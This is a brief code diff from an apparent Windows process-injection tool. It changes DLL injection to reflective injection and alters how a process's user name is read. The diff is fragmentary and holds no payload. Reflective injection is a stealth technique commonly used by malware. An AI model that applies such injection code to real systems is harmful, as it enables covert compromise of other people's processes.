@@ -58,8 +58,7 @@ BOOL GetProcessList(PPROCESS_LIST_ENTRY entries, LPDWORD count)
 				{
 					GetProcessIntegrityLevel(process, &entry->IntegrityLevel);
 
-					DWORD userNameLength = 256;
-					if (!GetProcessUserName(process, entry->UserName, &userNameLength))
+					if (!GetProcessUserName(process, entry->UserName, MAX_PATH + 1))
 					{
 						entry->UserName[0] = L'\0';
 					}
@@ -100,7 +99,7 @@ BOOL CreateConfigSystem()
 }
 BOOL Inject(DWORD processId, LPBYTE dll, DWORD dllSize)
 {
-	return InjectDll(processId, dll, dllSize);
+	return InjectDllReflective(processId, dll, dllSize, 100);
 }
 BOOL InjectAll(LPBYTE dll32, DWORD dll32Size, LPBYTE dll64, DWORD dll64Size)
 {
